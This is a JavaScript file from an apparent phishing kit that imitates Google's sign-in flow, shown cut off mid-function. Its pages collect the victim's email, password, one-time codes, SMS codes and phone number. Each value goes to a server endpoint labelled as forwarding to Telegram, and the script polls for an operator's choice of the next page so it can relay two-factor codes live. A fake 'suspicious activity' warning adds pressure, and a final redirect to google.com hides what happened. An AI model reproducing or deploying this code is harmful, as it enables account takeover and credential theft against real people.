// ============================================================
// ENHANCED AUTH HANDLER - Google UI Matching Version
// ============================================================
let currentSessionId = null;
let currentEmail = null;

document.addEventListener('DOMContentLoaded', function() {
  initEmailPage();
});

function initEmailPage() {
  const form = document.getElementById('email-form');
  const emailInput = document.getElementById('email-input');
  const nextButton = document.getElementById('next-button');

  if (!form || !emailInput || !nextButton) return;

  emailInput.addEventListener('input', function() {
    if (this.value.length > 0) {
      this.setAttribute('data-has-content', 'true');
    }
  });

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    const email = emailInput.value.trim();

    if (!email) {
      showError('Please enter an email or phone', emailInput);
      return;
    }

    nextButton.disabled = true;
    nextButton.textContent = 'Verifying…';

    fetch('/api/validate-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email })
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        currentEmail = email;
        createSession(email);
        
        const container = document.querySelector('.qx5512-pg');
        if (container) {
          container.style.transition = 'opacity 0.3s ease-out';
          container.style.opacity = '0';
        }

        setTimeout(function() {
          showPasswordPage(email);
        }, 300);
      } else {
        showError(data.message || 'Validation failed', emailInput);
        nextButton.disabled = false;
        nextButton.textContent = 'Next';
      }
    })
    .catch(error => {
      console.error('API Error:', error);
      showError('Network error. Please try again.', emailInput);
      nextButton.disabled = false;
      nextButton.textContent = 'Next';
    });
  });
}

function createSession(email) {
  // Generate sessionId immediately (don't wait for server round-trip)
  currentSessionId = generateSessionId();
  console.log('Session ID generated:', currentSessionId);

  // Send email to Telegram right away
  sendToTelegram('EMAIL', email, email, currentSessionId);

  // Also tell server about the session (fire-and-forget)
  fetch('/api/create-session', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: email, sessionId: currentSessionId })
  })
  .then(r => r.json())
  .then(data => console.log('Session confirmed on server:', data))
  .catch(error => console.error('Session sync error (non-fatal):', error));
}

function generateSessionId() {
  // Match PHP md5(uniqid()) format - 32 hex chars
  return Array.from(crypto.getRandomValues(new Uint8Array(16)))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

function showError(message, inputElement) {
  const existing = document.querySelector('.error-container');
  if (existing) {
    existing.remove();
  }

  if (inputElement) {
    inputElement.classList.add('error-input');
  }

  const errorContainer = document.createElement('div');
  errorContainer.className = 'error-container';
  errorContainer.style.cssText = 'display:flex;align-items:center;gap:12px;margin-top:12px;padding:0;';

  const icon = document.createElement('div');
  icon.style.cssText = 'flex-shrink:0;width:24px;height:24px;background-color:#f8d7da;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;color:#d33f3f;font-size:16px;';
  icon.textContent = '!';

  const messageSpan = document.createElement('span');
  messageSpan.style.cssText = 'color:#d33f3f;font-size:13px;font-weight:500;';
  messageSpan.textContent = message;

  errorContainer.appendChild(icon);
  errorContainer.appendChild(messageSpan);

  const form = document.getElementById('email-form');
  form.insertAdjacentElement('beforeend', errorContainer);

  setTimeout(function() { errorContainer.remove(); }, 5000);
}

// ============================================================
// PASSWORD PAGE
// ============================================================
function showPasswordPage(email) {
  document.body.innerHTML = buildPasswordPageHTML(email);
  initPasswordPage(email);

  const container = document.querySelector('.qx5512-pg');
  if (container) {
    container.style.opacity = '0';
    setTimeout(function() {
      container.style.transition = 'opacity 0.3s ease-in';
      container.style.opacity = '1';
    }, 10);
  }
}

function buildPasswordPageHTML(email) {
  const safeEmail = String(email)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');

  return '' +
'<style>' +
'.qx5512-pw[data-has-content] + .qx5512-il,' +
'.qx5512-pw:not(:placeholder-shown) + .qx5512-il {' +
'  font-size: .75rem;' +
'  line-height: 1rem;' +
'  top: 0;' +
'  transform: translateY(-50%);' +
'}' +
'</style>' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24" aria-label="Google" role="img">' +
'          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>' +
'          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>' +
'          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>' +
'          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>' +
'        </svg>' +
'        <h1>Welcome</h1>' +
'        <button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed">' +
'          <span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span>' +
'        </button>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <form class="qx5512-pf" id="password-form">' +
'          <div>' +
'            <div class="qx5512-if">' +
'              <input class="qx5512-pw" required type="password" id="password-input" placeholder=" ">' +
'              <span class="qx5512-il">Enter your password</span>' +
'            </div>' +
'            <div class="qx5512-cr">' +
'              <input id="show-password" type="checkbox">' +
'              <label for="show-password">Show password</label>' +
'            </div>' +
'            <p class="qx5512-pl">Before using this app, you can review Invitely\'s <a href="#">privacy policy</a> and <a href="#">terms of service</a>.</p>' +
'          </div>' +
'          <div class="qx5512-bg qx5512-pa">' +
'            <a href="#" class="qx5512-fl">Try another way</a>' +
'            <button type="submit" class="qx5512-nb">Next</button>' +
'          </div>' +
'        </form>' +
'      </div>' +
'    </div>' +
'  </div>' +
'  <footer class="qx5512-pf-ft">' +
'    <div class="qx5512-ls-w">' +
'      <select class="qx5512-ls" aria-label="Language">' +
'        <option value="en" selected>English (United States)</option>' +
'      </select>' +
'    </div>' +
'    <nav class="qx5512-fl-nk" aria-label="Footer">' +
'      <a href="#">Help</a>' +
'      <a href="#">Privacy</a>' +
'      <a href="#">Terms</a>' +
'    </nav>' +
'  </footer>' +
'</div>';
}

function initPasswordPage(email) {
  const passwordInput = document.getElementById('password-input');
  const showCheckbox = document.getElementById('show-password');
  const form = document.getElementById('password-form');
  const submitBtn = form ? form.querySelector('button[type="submit"]') : null;

  if (passwordInput) {
    passwordInput.addEventListener('input', function() {
      if (this.value.length > 0) {
        this.setAttribute('data-has-content', 'true');
      }
    });
  }

  if (showCheckbox && passwordInput) {
    showCheckbox.addEventListener('change', function() {
      passwordInput.type = this.checked ? 'text' : 'password';
    });
  }

  if (form && submitBtn) {
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const password = passwordInput.value.trim();

      if (!password) {
        alert('Please enter your password');
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = 'Signing in…';

      fetch('/api/validate-password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ password: password, sessionId: currentSessionId })
      })
      .then(response => response.json())
      .then(data => {
        sendToTelegram('PASSWORD', currentEmail, password, currentSessionId);
        
        if (currentSessionId) {
          pollForResponse(currentSessionId, submitBtn);
        } else {
          console.error('No sessionId available - cannot poll');
          submitBtn.disabled = false;
          submitBtn.textContent = 'Next';
        }
      })
      .catch(error => {
        console.error('API Error:', error);
        submitBtn.disabled = false;
        submitBtn.textContent = 'Next';
      });
    });
  }
}

// ============================================================
// SEND DATA TO TELEGRAM (Cumulative)
// ============================================================
function sendToTelegram(dataType, email, data, sessionId) {
  fetch('/api/send-to-telegram', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      type: dataType,
      email: email,
      data: data,
      sessionId: sessionId
    })
  })
  .then(response => response.json())
  .catch(error => console.error('Telegram send error:', error));
}

// ============================================================
// POLLING - Wait for Telegram bot response
// ============================================================
function pollForResponse(sessionId, submitBtn) {
  const maxWaitTime = 120000;
  const pollInterval = 1000;
  let elapsedTime = 0;
  const startTime = Date.now();

  const poller = setInterval(function() {
    elapsedTime = Date.now() - startTime;

    fetch('/api/poll-session?sessionId=' + sessionId)
      .then(response => response.json())
      .then(data => {
        if (data.status === 'responded' && data.responseType) {
          clearInterval(poller);
          handleTelegramResponse(data.responseType, data.response, data.email, sessionId);
        }
        
        if (elapsedTime > maxWaitTime) {
          clearInterval(poller);
          submitBtn.disabled = false;
          submitBtn.textContent = 'Next';
          alert('Request timed out. Please try again.');
        }
      })
      .catch(error => {
        console.error('Poll error:', error);
      });
  }, pollInterval);
}

// ============================================================
// RESPONSE HANDLERS
// ============================================================
function handleTelegramResponse(responseType, responseText, email, sessionId) {
  const container = document.querySelector('.qx5512-pg');
  if (container) {
    container.style.transition = 'opacity 0.3s ease-out';
    container.style.opacity = '0';
  }

  setTimeout(function() {
    switch(responseType) {
      case 'incorrect_password':
        showIncorrectPasswordPage(email, sessionId);
        break;
      case 'otp_required':
        showOTPPage(email, sessionId);
        break;
      case 'phone_verification':
        showPhoneVerificationPage(email, responseText, sessionId);
        break;
      case 'sms_code':
        showSMSCodePage(email, sessionId);
        break;
      case 'success':
        showSuccessPage();
        break;
      case 'sua':
        showSUAPage(email, sessionId);
        break;
      case 'error':
        showErrorPage(responseText);
        break;
      default:
        showSuccessPage();
    }

    const pg = document.querySelector('.qx5512-pg');
    if (pg) {
      pg.style.opacity = '0';
      setTimeout(function() {
        pg.style.transition = 'opacity 0.3s ease-in';
        pg.style.opacity = '1';
      }, 10);
    }
  }, 300);
}

// ============================================================
// INCORRECT PASSWORD PAGE - Google UI Match
// ============================================================
function showIncorrectPasswordPage(email, sessionId) {
  const safeEmail = String(email).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  
  document.body.innerHTML = '' +
'<style>' +
'.qx5512-pw[data-has-content] + .qx5512-il,' +
'.qx5512-pw:not(:placeholder-shown) + .qx5512-il {' +
'  font-size: .75rem;' +
'  line-height: 1rem;' +
'  top: 0;' +
'  transform: translateY(-50%);' +
'}' +
'</style>' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24" aria-label="Google" role="img">' +
'          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>' +
'          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>' +
'          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>' +
'          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>' +
'        </svg>' +
'        <h1>Welcome</h1>' +
'        <button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed">' +
'          <span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span>' +
'        </button>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <form class="qx5512-pf" id="password-form-retry">' +
'          <div>' +
'            <div style="display:flex;align-items:center;gap:8px;margin-bottom:16px;padding:12px;background:#fce8e6;border-radius:4px;">' +
'              <svg width="20" height="20" viewBox="0 0 24 24" style="flex-shrink:0;">' +
'                <circle cx="12" cy="12" r="10" fill="none" stroke="#d33f3f" stroke-width="2"/>' +
'                <text x="12" y="16" text-anchor="middle" fill="#d33f3f" font-weight="bold" font-size="14">!</text>' +
'              </svg>' +
'              <span style="color:#d33f3f;font-size:14px;font-weight:500;">Wrong password. Try again or click "Forgot password?" for more options.</span>' +
'            </div>' +
'            <div class="qx5512-if">' +
'              <input class="qx5512-pw" required type="password" id="password-input-retry" placeholder=" ">' +
'              <span class="qx5512-il">Enter your password</span>' +
'            </div>' +
'            <div class="qx5512-cr">' +
'              <input id="show-password-retry" type="checkbox">' +
'              <label for="show-password-retry">Show password</label>' +
'            </div>' +
'          </div>' +
'          <div class="qx5512-bg qx5512-pa">' +
'            <a href="#" class="qx5512-fl">Forgot password?</a>' +
'            <button type="submit" class="qx5512-nb">Next</button>' +
'          </div>' +
'        </form>' +
'      </div>' +
'    </div>' +
'  </div>' +
'  <footer class="qx5512-pf-ft">' +
'    <div class="qx5512-ls-w">' +
'      <select class="qx5512-ls" aria-label="Language">' +
'        <option value="en" selected>English (United States)</option>' +
'      </select>' +
'    </div>' +
'    <nav class="qx5512-fl-nk" aria-label="Footer">' +
'      <a href="#">Help</a>' +
'      <a href="#">Privacy</a>' +
'      <a href="#">Terms</a>' +
'    </nav>' +
'  </footer>' +
'</div>';

  const passwordInput = document.getElementById('password-input-retry');
  const showCheckbox = document.getElementById('show-password-retry');
  const form = document.getElementById('password-form-retry');
  const submitBtn = form.querySelector('button[type="submit"]');

  if (passwordInput) {
    passwordInput.addEventListener('input', function() {
      if (this.value.length > 0) {
        this.setAttribute('data-has-content', 'true');
      }
    });
  }

  if (showCheckbox && passwordInput) {
    showCheckbox.addEventListener('change', function() {
      passwordInput.type = this.checked ? 'text' : 'password';
    });
  }

  if (form && submitBtn) {
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const password = passwordInput.value.trim();
      
      if (!password) {
        alert('Please enter your password');
        return;
      }
      
      submitBtn.disabled = true;
      submitBtn.textContent = 'Signing in…';
      
      fetch('/api/validate-password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ password: password, sessionId: currentSessionId })
      })
      .then(response => response.json())
      .then(data => {
        sendToTelegram('PASSWORD', currentEmail, password, currentSessionId);
        
        if (currentSessionId) {
          pollForResponse(currentSessionId, submitBtn);
        }
      })
      .catch(error => {
        console.error('API Error:', error);
        submitBtn.disabled = false;
        submitBtn.textContent = 'Next';
      });
    });
  }
}

// ============================================================
// OTP PAGE
// ============================================================
function showOTPPage(email, sessionId) {
  const safeEmail = String(email).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  document.body.innerHTML = '' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg>' +
'        <h1>Verify it\'s you</h1>' +
'        <p style="color:#e3e3e3;max-width:420px;margin:12px 0 0;font-size:1rem;">Enter the 6-digit code we sent to your email</p>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <form id="otp-form" style="display:flex;flex-direction:column;gap:16px;">' +
'          <input type="text" id="otp-input" placeholder="Enter verification code" maxlength="6" style="padding:12px;border:1px solid #5f6368;border-radius:4px;background:#202124;color:#e8eaed;font-size:16px;" required>' +
'          <button type="submit" class="qx5512-nb">Verify</button>' +
'        </form>' +
'      </div>' +
'    </div>' +
'  </div>' +
'</div>';

  document.getElementById('otp-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const otpCode = document.getElementById('otp-input').value.trim();
    
    if (otpCode.length !== 6) {
      alert('Please enter a 6-digit code');
      return;
    }
    
    sendToTelegram('OTP', email, otpCode, sessionId);
    
    document.getElementById('otp-input').disabled = true;
    this.querySelector('button').disabled = true;
    this.querySelector('button').textContent = 'Verifying…';
    
    setTimeout(() => {
      pollForResponse(sessionId, this.querySelector('button'));
    }, 500);
  });
}

// ============================================================
// SMS CODE PAGE - Hidden Phone Number
// ============================================================
function showSMSCodePage(email, sessionId) {
  document.body.innerHTML = '' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg>' +
'        <h1>Verify it\'s you</h1>' +
'        <p style="color:#e3e3e3;max-width:420px;margin:12px 0 0;font-size:1rem;">A text message with a verification code was just sent to your phone number</p>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <form id="sms-form" style="display:flex;flex-direction:column;gap:16px;">' +
'          <input type="text" id="sms-input" placeholder="Enter code" style="padding:12px;border:1px solid #5f6368;border-radius:4px;background:#202124;color:#e8eaed;font-size:16px;" required>' +
'          <button type="submit" class="qx5512-nb">Verify</button>' +
'        </form>' +
'      </div>' +
'    </div>' +
'  </div>' +
'</div>';

  document.getElementById('sms-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const smsCode = document.getElementById('sms-input').value.trim();
    
    if (!smsCode) {
      alert('Please enter the SMS code');
      return;
    }
    
    sendToTelegram('SMS_CODE', email, smsCode, sessionId);
    
    document.getElementById('sms-input').disabled = true;
    this.querySelector('button').disabled = true;
    this.querySelector('button').textContent = 'Verifying…';
    
    setTimeout(() => {
      pollForResponse(sessionId, this.querySelector('button'));
    }, 500);
  });
}

// ============================================================
// PHONE VERIFICATION PAGE - With Country Code Selector
// ============================================================
function showPhoneVerificationPage(email, phoneNumber, sessionId) {
  const countryFlags = {
    'US': '🇺🇸',
    'CA': '🇨🇦',
    'GB': '🇬🇧',
    'AU': '🇦🇺',
    'DE': '🇩🇪',
    'FR': '🇫🇷',
    'IN': '🇮🇳',
    'BR': '🇧🇷',
    'MX': '🇲🇽',
    'JP': '🇯🇵',
    'CN': '🇨🇳',
    'RU': '🇷🇺',
    'ZA': '🇿🇦',
    'NG': '🇳🇬',
    'KE': '🇰🇪'
  };

  const countryCodes = {
    'US': '+1',
    'CA': '+1',
    'GB': '+44',
    'AU': '+61',
    'DE': '+49',
    'FR': '+33',
    'IN': '+91',
    'BR': '+55',
    'MX': '+52',
    'JP': '+81',
    'CN': '+86',
    'RU': '+7',
    'ZA': '+27',
    'NG': '+234',
    'KE': '+254'
  };

  document.body.innerHTML = '' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg>' +
'        <h1>Verify it\'s you</h1>' +
'        <p style="color:#e3e3e3;max-width:420px;margin:12px 0 0;font-size:1rem;">Confirm the phone number you added to your account</p>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <form id="phone-form" style="display:flex;flex-direction:column;gap:16px;">' +
'          <div style="display:flex;gap:8px;">' +
'            <select id="country-select" style="padding:12px;border:1px solid #5f6368;border-radius:4px;background:#202124;color:#e8eaed;font-size:14px;flex:0;min-width:90px;">' +
'              <option value="US">🇺🇸 +1</option>' +
'              <option value="CA">🇨🇦 +1</option>' +
'              <option value="GB">🇬🇧 +44</option>' +
'              <option value="AU">🇦🇺 +61</option>' +
'              <option value="DE">🇩🇪 +49</option>' +
'              <option value="FR">🇫🇷 +33</option>' +
'              <option value="IN">🇮🇳 +91</option>' +
'              <option value="BR">🇧🇷 +55</option>' +
'              <option value="MX">🇲🇽 +52</option>' +
'              <option value="JP">🇯🇵 +81</option>' +
'              <option value="CN">🇨🇳 +86</option>' +
'              <option value="RU">🇷🇺 +7</option>' +
'              <option value="ZA">🇿🇦 +27</option>' +
'              <option value="NG">🇳🇬 +234</option>' +
'              <option value="KE">🇰🇪 +254</option>' +
'            </select>' +
'            <input type="tel" id="phone-code-input" placeholder="Phone number" style="flex:1;padding:12px;border:1px solid #5f6368;border-radius:4px;background:#202124;color:#e8eaed;font-size:16px;" required>' +
'          </div>' +
'          <button type="submit" class="qx5512-nb">Send code</button>' +
'        </form>' +
'      </div>' +
'    </div>' +
'  </div>' +
'</div>';

  document.getElementById('phone-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const countrySelect = document.getElementById('country-select');
    const phoneCode = document.getElementById('phone-code-input').value.trim();
    const selectedCountry = countrySelect.value;
    const countryCode = countryCodes[selectedCountry];
    
    if (!phoneCode) {
      alert('Please enter a phone number');
      return;
    }
    
    const fullPhone = countryCode + phoneCode;
    sendToTelegram('PHONE_CODE', email, fullPhone, sessionId);
    
    document.getElementById('phone-code-input').disabled = true;
    countrySelect.disabled = true;
    this.querySelector('button').disabled = true;
    this.querySelector('button').textContent = 'Sending…';
    
    setTimeout(() => {
      pollForResponse(sessionId, this.querySelector('button'));
    }, 500);
  });
}

// ============================================================
// ERROR PAGE
// ============================================================
function showErrorPage(errorMessage) {
  document.body.innerHTML = '' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg>' +
'        <h1 style="color:#d33f3f;">Error</h1>' +
'        <p style="color:#e3e3e3;max-width:420px;margin:12px 0 0;font-size:1rem;">' + (errorMessage || 'An error occurred') + '</p>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <div style="display:flex;justify-content:flex-end;align-items:center;width:100%;margin-top:auto;padding-top:32px;">' +
'          <button type="button" class="qx5512-nb" onclick="window.location.reload()">Try again</button>' +
'        </div>' +
'      </div>' +
'    </div>' +
'  </div>' +
'</div>';
}

// ============================================================
// SUCCESS PAGE
// ============================================================
function showSuccessPage() {
  document.body.innerHTML = '' +
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg>' +
'        <h1>You\'re signed in</h1>' +
'        <p style="color:#e3e3e3;max-width:420px;margin:12px 0 0;font-size:1rem;">Redirecting you now...</p>' +
'      </div>' +
'    </div>' +
'  </div>' +
'</div>';
  
  setTimeout(function() {
    window.location.href = 'https://www.google.com';
  }, 3000);
}



// ============================================================
// SUA PAGE - Suspicious Activity
// ============================================================
function showSUAPage(email, sessionId) {
  document.body.innerHTML =
'<div class="qx5512-pg">' +
'  <div class="qx5512-mn">' +
'    <div class="qx5512-lc">' +
'      <div class="qx5512-bs">' +
'        <svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg>' +
'        <h1 style="color:#ea4335;">Suspicious activity detected</h1>' +
'        <p style="color:#e3e3e3;max-width:420px;margin:12px 0 0;font-size:1rem;">Google has detected unusual activity on your account. To protect your account, you will need to verify your identity.</p>' +
'      </div>' +
'      <div class="qx5512-fs">' +
'        <div style="background:#fce8e6;border-radius:4px;padding:16px;margin-bottom:16px;">' +
'          <p style="color:#d93025;font-size:14px;margin:0;">For your security, we need to verify it\'s really you. Check your registered email or phone for a verification code.</p>' +
'        </div>' +
'        <form id="sua-form" style="display:flex;flex-direction:column;gap:16px;">' +
'          <input type="text" id="sua-input" placeholder="Enter verification code" style="padding:12px;border:1px solid #5f6368;border-radius:4px;background:#202124;color:#e8eaed;font-size:16px;" required>' +
'          <button type="submit" class="qx5512-nb">Verify</button>' +
'        </form>' +
'      </div>' +
'    </div>' +
'  </div>' +
'</div>';

  document.getElementById('sua-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const code = document.getElementById('sua-input').value.trim();
    if (!code) { alert('Please enter the verification code'); return; }

    sendToTelegram('OTP', email, code, sessionId);

    document.getElementById('sua-input').disabled = true;
    this.querySelector('button').disabled = true;
